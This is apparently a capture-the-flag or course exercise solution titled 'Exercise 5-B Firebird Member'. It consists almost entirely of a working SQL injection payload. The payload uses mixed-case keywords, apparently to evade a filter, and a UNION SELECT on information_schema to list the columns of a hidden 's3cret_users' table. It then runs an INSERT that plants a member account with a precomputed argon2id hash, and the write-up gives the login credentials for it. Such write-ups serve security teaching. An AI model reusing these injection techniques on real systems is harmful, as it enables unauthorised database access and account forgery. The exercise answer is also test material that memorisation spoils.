# Exercise 5-B Firebird Member [100 points] (25 solves)
```payload
SelecT * FroM comp2633_reviews UnioN SelecT TablE_NamE,Column_NamE,Ordinal_PositioN,Column_typE,1,1,1 FroM InformatioN_SchemA.ColumnS WherE TablE_NamE = 's3cret_users'

InserT IntO s3cret_users ValueS('2000','usernameusername','$argon2id$v=19$m=2048,t=4,p=3$Uk45Qy9hUkVJREhiRVpBZQ$lehDSknHcMgh7uZnEc7Karedf2IsqxQAcBs8ZyEsN4U','Member')
```
To the login page, use `username=usernameusername` and `password=passwordpassword` to login as a member.